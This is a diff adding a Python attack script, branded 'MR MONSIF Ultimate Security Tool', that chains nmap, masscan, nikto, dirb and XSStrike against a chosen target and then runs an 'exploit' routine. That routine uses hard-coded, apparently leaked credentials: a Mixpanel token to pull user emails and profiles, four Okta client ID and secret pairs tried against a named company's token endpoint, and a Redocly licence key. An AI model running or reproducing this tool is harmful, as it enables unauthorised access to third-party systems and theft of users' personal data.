@@ -1,0 +1,191 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import getpass
+import subprocess
+import requests
+import socket
+import random
+import time
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
+
+# تعريف الثوابت
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+OKTA_URL = "https://auth.skyflow-preview.com/oauth2/default/token"
+
+class MR_MONSIF_Tool_Ultimate:
+    def __init__(self):
+        self.password = "mrmonsif@root900004587@"  # كلمة السر الافتراضية (يمكنك تغييرها)
+        self.tools_path = "/usr/bin"  # مسار أدوات Kali
+        self.target = None
+        self.print_header()
+
+    def print_header(self):
+        print("""
+        ███████╗██╗  ██╗███████╗██╗  ██╗    ███████╗██████╗  █████╗ ███████╗███████╗
+        ██╔════╝╚██╗██╔╝██╔════╝╚██╗██╔╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
+        █████╗   ╚███╔╝ █████╗   ╚███╔╝     █████╗  ██████╔╝███████║███████╗███████╗
+        ██╔══╝   ██╔██╗ ██╔══╝   ██╔██╗     ██╔══╝  ██╔══██╗██╔══██║╚════██║╚════██║
+        ███████╗██╔╝ ██╗███████╗██╔╝ ██╗    ███████╗██║  ██║██║  ██║███████║███████║
+        ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
+        MR MONSIF - Ultimate Security Tool
+        Version 5.0 - Exclusively for MR MONSIF - Powered by MR MONSIF
+        """)
+
+    def authenticate(self):
+        attempts = 3
+        while attempts > 0:
+            password = getpass.getpass("Enter MR MONSIF password: ")
+            if password == self.password:
+                return True
+            print(f"Wrong password. {attempts - 1} attempts remaining.")
+            attempts -= 1
+        print("Authentication failed. Exiting...")
+        sys.exit(1)
+
+    def scan_ports(self, target):
+        print("\nScanning ports with Nmap and Masscan...")
+        nmap_cmd = f"nmap -p- -T5 -A {target}"
+        masscan_cmd = f"masscan {target} -p1-65535 --rate=10000"
+        for cmd in [nmap_cmd, masscan_cmd]:
+            try:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                with open(f"ports_{target.replace(':', '_')}.txt", "a") as f:
+                    f.write(result.stdout)
+                print(f"Port scan result saved to ports_{target.replace(':', '_')}.txt")
+            except Exception as e:
+                print(f"Port scan failed: {str(e)}")
+
+    def scan_vulnerabilities(self, target):
+        print("\nScanning vulnerabilities with Nikto and Dirb...")
+        nikto_cmd = f"nikto -h {target}"
+        dirb_cmd = f"dirb {target} /usr/share/wordlists/dirb/big.txt"
+        for cmd in [nikto_cmd, dirb_cmd]:
+            try:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                with open(f"vulns_{target.replace(':', '_')}.txt", "a") as f:
+                    f.write(result.stdout)
+                print(f"Vulnerability scan result saved to vulns_{target.replace(':', '_')}.txt")
+            except Exception as e:
+                print(f"Vulnerability scan failed: {str(e)}")
+
+    def scan_xss_sqli(self, target):
+        print("\nScanning XSS and SQLi with XSStrike...")
+        xsstrike_cmd = f"xsstrike -u {target} --seeds 200 --timeout 60 --fuzz"
+        try:
+            result = subprocess.run(xsstrike_cmd, shell=True, capture_output=True, text=True)
+            with open(f"xss_sqli_{target.replace(':', '_')}.txt", "a") as f:
+                f.write(result.stdout)
+            print(f"XSS/SQLi scan result saved to xss_sqli_{target.replace(':', '_')}.txt")
+        except Exception as e:
+            print(f"XSS/SQLi scan failed: {str(e)}")
+
+    def gather_sensitive_data(self, target):
+        print("\nGathering sensitive data (config.js, headers, etc.)...")
+        try:
+            # فحص config.js
+            config_url = f"https://{target}/config/config.js"
+            response = requests.get(config_url, verify=False, timeout=20, headers={"User-Agent": USER_AGENT})
+            if response.status_code == 200:
+                with open(f"config_{target.replace(':', '_')}.txt", "w") as f:
+                    f.write(response.text)
+                print(f"Config data saved to config_{target.replace(':', '_')}.txt")
+                self.check_sensitive_tokens(response.text)
+        except Exception as e:
+            print(f"Failed to gather config.js: {str(e)}")
+
+        # فحص الرؤوس (Headers)
+        try:
+            response = requests.head(f"https://{target}", verify=False, timeout=20, headers={"User-Agent": USER_AGENT})
+            headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
+            with open(f"headers_{target.replace(':', '_')}.txt", "w") as f:
+                f.write(headers)
+            print(f"Headers saved to headers_{target.replace(':', '_')}.txt")
+        except Exception as e:
+            print(f"Failed to gather headers: {str(e)}")
+
+    def check_sensitive_tokens(self, data):
+        tokens = [
+            "MIXPANEL_TOKEN", "OKTA_ISSUER_URL", "REDOCLY_LICENCE_KEY",
+            "token", "secret", "key", "password", "api_key", "access_token"
+        ]
+        for token in tokens:
+            if token.lower() in data.lower():
+                print(f"Found sensitive token: {token} in data!")
+                with open("sensitive_tokens.txt", "a") as f:
+                    f.write(f"Found {token} in {self.target}\n")
+
+    def exploit_sensitive_data(self, target):
+        print("\nExploiting sensitive data (Mixpanel, Okta, Redocly)...")
+        # Mixpanel
+        mixpanel_url = "https://api.mixpanel.com/engage"
+        mixpanel_payload = {
+            "where": {"$token": "530a08941c8587643b4e85f2e262d9f8"},
+            "select": ["$distinct_id", "$properties.email", "$properties.name", "$properties"],
+            "limit": 5000
+        }
+        try:
+            response = requests.post(mixpanel_url, json=mixpanel_payload, verify=False, timeout=20, headers={"User-Agent": USER_AGENT})
+            with open(f"mixpanel_{target.replace(':', '_')}.txt", "w") as f:
+                f.write(response.text)
+            print(f"Mixpanel exploit saved to mixpanel_{target.replace(':', '_')}.txt: {response.text[:50]}...")
+        except Exception as e:
+            print(f"Mixpanel exploit failed: {str(e)}")
+
+        # Okta
+        okta_credentials = [
+            ("skyflow_vault_auth_final", "skyflow_key_final1234"),
+            ("skyflow_auth_vault", "skyflow_key9012"),
+            ("skyflow_vault_api", "skyflow_key1234"),
+            ("skyflow_auth_admin", "skyflow_secret123")
+        ]
+        for client_id, client_secret in okta_credentials:
+            data = f"grant_type=client_credentials&client_id={client_id}&client_secret={client_secret}"
+            try:
+                response = requests.post(OKTA_URL, data=data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": USER_AGENT}, verify=False, timeout=20)
+                filename = f"okta_{client_id}_{target.replace(':', '_')}.txt"
+                with open(filename, "w") as f:
+                    f.write(response.text)
+                print(f"Okta exploit for {client_id} saved to {filename}: {response.text[:50]}...")
+                if "token" in response.text.lower():
+                    break
+            except Exception as e:
+                print(f"Okta exploit failed for {client_id}: {str(e)}")
+
+        # Redocly
+        redocly_url = "https://redoc.ly/api/v1/license/validate"
+        params = {"key": "eyJ0IjpmYWxzZSwiaSI6MTYzNzEzMDY2OCwiZSI6MTY2ODYxNDg0MSwiaCI6WyJyZWRvYy5seSIsInd3dy5za3lmbG93LmNvbS9kb2NzIiwic2t5Zmxvdy5kZXYiLCJza3lmbG93LmNvbSIsInNreWZsb3cudGVjaCJdLCJzIjoicG9ydGFsIn0=.VrkD1C28cl4nVM0wlx65z7iL9TkXXSTiaJiyB29UiXUdAaHdvkhUsi5Z8kVXyzw/91xA3zX59n7uEv+O0ts/gg=="}
+        try:
+            response = requests.get(redocly_url, params=params, verify=False, timeout=20, headers={"User-Agent": USER_AGENT})
+            with open(f"redocly_{target.replace(':', '_')}.txt", "w") as f:
+                f.write(response.text)
+            print(f"Redocly exploit saved to redocly_{target.replace(':', '_')}.txt: {response.text[:50]}...")
+        except Exception as e:
+            print(f"Redocly exploit failed: {str(e)}")
+
+    def run(self):
+        if not self.authenticate():
+            return
+
+        target = input("Enter target URL or IP (e.g., pentest-app.onetrust.com:443): ").strip()
+        if not target:
+            print("No target specified. Exiting...")
+            return
+
+        self.target = target
+        print(f"\nStarting MR MONSIF Security Tool on {target}...")
+
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.submit(self.scan_ports, target)
+            executor.submit(self.scan_vulnerabilities, target)
+            executor.submit(self.scan_xss_sqli, target)
+            executor.submit(self.gather_sensitive_data, target)
+            executor.submit(self.exploit_sensitive_data, target)
+
+        print("\nScan completed. Check result files on Desktop.")
+
+if __name__ == "__main__":
+    tool = MR_MONSIF_Tool_Ultimate()
+    tool.run()
